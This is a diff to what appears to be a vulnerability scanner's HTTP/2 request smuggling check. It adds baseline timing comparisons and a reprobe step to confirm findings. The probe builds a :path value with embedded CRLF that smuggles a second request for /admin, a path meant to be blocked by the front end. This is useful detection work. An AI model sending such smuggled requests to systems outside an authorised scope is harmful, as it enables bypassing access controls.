@@ -116,14 +116,14 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
 
 # ---------- 1: CRLF in :path / :authority --------------------------------
 
-async def _crlf_pseudo_header(host, port, path, use_tls, bucket, url) -> list[dict]:
+async def _measure_crlf(host, port, path, use_tls, bucket) -> tuple[float, bytes, str]:
+    """Send the CRLF-in-:path probe; return (elapsed, response_bytes, smuggled_path)."""
     reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
-    if conn is None:
-        return []
-    findings = []
     # craft a :path with embedded CRLF + smuggled second request
     # the smuggled request asks for /admin which front-end might block but back-end honors
     smuggled = f"{path} HTTP/1.1\r\nHost: {host}\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}"
+    if conn is None:
+        return 0.0, b"", smuggled
     headers = [
         (":method", "GET"),
         (":path", smuggled),
@@ -142,20 +142,113 @@ async def _crlf_pseudo_header(host, port, path, use_tls, bucket, url) -> list[di
         writer.close(); await writer.wait_closed()
     except Exception:
         pass
-    if elapsed > 5.0 and data:
-        findings.append({
-            "category": "smuggling",
-            "title": "HTTP/2 request smuggling — CRLF in pseudo-header (:path)",
-            "severity": "critical", "cvss": 9.0,
-            "url": url,
-            "evidence": f"Request whose :path contained \\r\\n caused the upstream to "
-                        f"hang for {elapsed:.2f}s before responding — strong signal that "
-                        "the H2 frame was downgraded to HTTP/1.1 and a smuggled second "
-                        "request was queued on the back-end socket.",
-            "request": f"H2 :path = {repr(smuggled)[:200]}",
-            "metadata": {"elapsed_s": elapsed, "kind": "h2_crlf_path"},
-        })
+    return elapsed, data, smuggled
+
+
+async def _measure_clean(host, port, path, use_tls, bucket) -> float:
+    """Baseline: a well-formed H2 GET to the same path; return elapsed seconds."""
+    reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
+    if conn is None:
+        return 0.0
+    headers = [
+        (":method", "GET"), (":path", path or "/"),
+        (":scheme", "https" if use_tls else "http"),
+        (":authority", host), ("user-agent", "SamaritanX/1.0"),
+    ]
+    t0 = time.perf_counter()
+    try:
+        await _h2_send_request(host, conn, writer, headers)
+        await _h2_read_until_close(reader, conn, timeout=8.0)
+    except Exception:
+        pass
+    elapsed = time.perf_counter() - t0
+    try:
+        writer.close(); await writer.wait_closed()
+    except Exception:
+        pass
+    return elapsed
+
+
+async def _crlf_pseudo_header(host, port, path, use_tls, bucket, url) -> list[dict]:
+    findings = []
+    elapsed, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket)
+    if not (elapsed > 5.0 and data):
+        return findings
+
+    # One hang isn't proof — a cold connection or generic slow path looks the
+    # same. Confirm the CRLF probe hangs *and* a well-formed H2 GET to the same
+    # path stays prompt, then re-measure the CRLF probe once more for stability.
+    base = await _measure_clean(host, port, path, use_tls, bucket)
+    elapsed2, data2, _ = await _measure_crlf(host, port, path, use_tls, bucket)
+    if not (base < 5.0 and elapsed2 > 5.0 and data2):
+        return findings  # clean path also slow, or hang didn't reproduce → jitter
+
+    samples = [{"crlf_path_s": round(elapsed, 2)},
+               {"crlf_path_s": round(elapsed2, 2), "clean_path_s": round(base, 2)}]
+    findings.append({
+        "category": "smuggling",
+        "title": "HTTP/2 request smuggling — CRLF in pseudo-header (:path)",
+        "severity": "critical", "cvss": 9.0,
+        "url": url,
+        "evidence": f"A :path containing \\r\\n caused the upstream to hang for "
+                    f"{elapsed2:.2f}s while a clean H2 GET to the same path returned in "
+                    f"{base:.2f}s (confirmed across 2 rounds) — the malformed frame is "
+                    "downgraded to HTTP/1.1 and a smuggled second request queued.",
+        "request": f"H2 :path = {repr(smuggled)[:200]}",
+        "metadata": {"elapsed_s": elapsed2, "kind": "h2_crlf_path", "samples": samples},
+    })
     return findings
+
+
+async def reprobe(ctx: "Context", finding: dict):
+    """Re-verify an h2_crlf_path finding: the CRLF probe must hang while a clean
+    H2 GET to the same path returns promptly, reproducibly across repeats.
+
+    Returns ``(result, proof)`` — True (reproduced), False (hang gone), or None
+    (noisy / not applicable). The proof captures the smuggled :path and timings.
+    """
+    url = finding.get("url") or ""
+    parsed = urlparse(url)
+    host = parsed.hostname or ""
+    if not host:
+        return None, {}
+    if ctx.scope and not ctx.scope.allows(url)[0]:
+        return None, {}
+    if (finding.get("metadata") or {}).get("kind") != "h2_crlf_path":
+        return None, {}
+    use_tls = parsed.scheme == "https"
+    port = parsed.port or (443 if use_tls else 80)
+    path = parsed.path or "/"
+    bucket = ctx.http.host_bucket(parsed.netloc)
+
+    smuggled = ""
+    samples = []
+    for _ in range(2):
+        t_evil, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket)
+        t_base = await _measure_clean(host, port, path, use_tls, bucket)
+        samples.append({"crlf_path_s": round(t_evil, 2),
+                        "clean_path_s": round(t_base, 2),
+                        "responded": bool(data)})
+
+    confirmed = all(s["crlf_path_s"] > 5.0 and s["clean_path_s"] < 5.0 and s["responded"]
+                    for s in samples)
+    clearly_fast = all(s["crlf_path_s"] < 5.0 for s in samples)
+    proof = {
+        "verified": confirmed, "method": "RAW-H2", "url": url,
+        "request": f"H2 :path = {repr(smuggled)[:200]}",
+        "samples": samples,
+        "rationale": (
+            "A :path carrying CRLF hung (>5s) while a clean H2 GET to the same path "
+            f"returned promptly across {len(samples)} repeats — the malformed frame is "
+            "being downgraded and a smuggled request queued on the back-end socket."
+            if confirmed else
+            "The CRLF-induced hang did not reproduce consistently on re-test."),
+    }
+    if confirmed:
+        return True, proof
+    if clearly_fast:
+        return False, proof
+    return None, proof
 
 
 # ---------- 2: CONTINUATION abuse ----------------------------------------
